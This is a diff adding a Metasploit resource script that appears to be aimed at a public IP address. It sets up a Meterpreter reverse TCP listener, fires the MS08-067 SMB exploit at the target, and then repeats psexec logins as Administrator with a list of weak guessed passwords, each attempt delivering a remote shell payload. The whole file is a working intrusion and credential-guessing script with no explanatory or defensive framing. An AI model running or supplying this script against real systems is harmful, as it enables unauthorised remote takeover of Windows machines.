@@ -1,0 +1,60 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 1337
+exploit -j -z 
+setg DisablePayloadHandler 1
+use exploit/windows/smb/ms08_067_netapi 
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 1337
+exploit -j -z
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass aa
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass aaaa
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass password
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass admin
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass 1234
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBpass qwerty
+set RHOST 180.233.121.61
+set payload windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 10.0.2.15
+exploit -j -z 
